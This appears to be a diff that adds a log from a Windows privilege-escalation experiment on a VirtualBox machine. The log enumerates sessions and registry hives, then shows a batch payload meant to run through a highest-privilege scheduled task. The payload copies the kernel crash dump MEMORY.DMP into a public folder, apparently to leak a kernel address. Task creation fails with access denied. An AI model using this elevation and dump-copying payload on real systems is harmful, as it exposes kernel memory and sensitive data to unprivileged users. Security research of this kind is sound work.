@@ -1,0 +1,21 @@
+16:25:12.368 === h305 elev: schtasks /rl highest /it -> module owning 0xfffff80219033bc9 ===
+16:25:12.681   session | SESSIONNAME               USERNAME                 ID  STATE   TYPE        DEVICE
+16:25:12.684   session | services                                            0  Disc
+16:25:12.685   session | >console                   vboxuser                  1  Active
+16:25:12.859   hku | HKEY_USERS\.DEFAULT
+16:25:12.860   hku | HKEY_USERS\S-1-5-19
+16:25:12.861   hku | HKEY_USERS\S-1-5-20
+16:25:12.861   hku | HKEY_USERS\S-1-5-21-1957909355-363273533-3916154183-1000
+16:25:12.862   hku | HKEY_USERS\S-1-5-21-1957909355-363273533-3916154183-1000_Classes
+16:25:12.862   hku | HKEY_USERS\S-1-5-18
+16:25:19.052   task0 | ERROR: The system cannot find the file specified.
+16:25:19.055 pre-state: session1-loggedon=True hive=True task-exists=False
+16:25:19.219   stale | Could Not Find C:\Users\Public\h305_MEMORY.DMP
+16:25:19.560   payload | @echo off
+16:25:19.561   payload | echo START %DATE% %TIME% > "C:\Users\Public\h305_elevated.txt"
+16:25:19.562   payload | whoami >> "C:\Users\Public\h305_elevated.txt"
+16:25:19.563   payload | whoami /groups | findstr /i "Mandatory" >> "C:\Users\Public\h305_elevated.txt"
+16:25:19.564   payload | copy /y C:\Windows\MEMORY.DMP C:\Users\Public\h305_MEMORY.DMP >> "C:\Users\Public\h305_elevated.txt" 2>&1
+16:25:19.564   payload | echo COPY-RC=%ERRORLEVEL% >> "C:\Users\Public\h305_elevated.txt"
+16:25:20.401   create | ERROR: Access is denied.
+16:25:20.402 RESULT: FAIL - task create refused (variable: elevation trigger)
